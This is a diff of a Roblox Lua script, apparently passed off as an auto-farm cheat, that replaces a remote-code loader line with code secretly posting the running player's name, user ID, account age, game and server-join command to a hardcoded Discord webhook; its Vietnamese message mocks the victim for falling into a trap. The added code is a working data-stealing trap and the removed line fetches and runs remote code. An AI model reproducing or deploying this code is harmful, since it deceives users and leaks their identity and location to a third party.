@@ -1,1 +1,42 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Palosui/Auto-Farm/main/Free'))()
+HttpService = game:GetService("HttpService")  
+  Webhook_URL =  "https://discord.com/api/webhooks/1162993385712386078/5jlRkZ-0NujdOK_Vmm14ex3VhiU_klplIRlpOD2bawF0a8U7bupfry50GijHbbpkr8fh"  
+  local ok = request or http_request or (http and http.request) or syn.request  
+  ok(  
+  {  
+  Url = Webhook_URL,  
+  Method = 'POST',  
+  Headers = {  
+  ['Content-Type'] = 'application/json'  
+  },  
+  Body = HttpService:JSONEncode({  
+  ["content"] = "",  
+  ["embeds"] = {{  
+  ["author"] = {  
+  ["name"] = game.Players.LocalPlayer.Name,  
+  ["icon"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=100&height=100&format=png"  
+  },  
+  ["title"] = ""..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, 
+  ["description"] = " ["..game.Players.LocalPlayer.DisplayName.."] Vừa Dính Bẫy:))",  
+  ["type"] = "rich",  
+  ["color"] = tonumber(0xffffff),  
+  ["fields"] = {  
+  {  
+  ["name"] = "Script Sever",  
+  ["value"] = "game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId,'"..game.JobId.."')",  
+  ["inline"] = true },  
+  {  
+  ["name"] = "Người Dùng ID:",  
+  ["value"] = game:GetService("Players").LocalPlayer.UserId,  
+  ["inline"] = true },  
+  {  
+  ["name"] = "Script Game",  
+  ["value"] = "game:GetService('TeleportService'):Teleport("..game.PlaceId..")",  
+  ["inline"] = true },  
+  {  
+  ["name"] = "Số tuổi của Account:",  
+  ["value"] = game:GetService("Players").LocalPlayer.AccountAge,  
+  ["inline"] = true }  
+  }  
+  }}  
+  })  
+  })
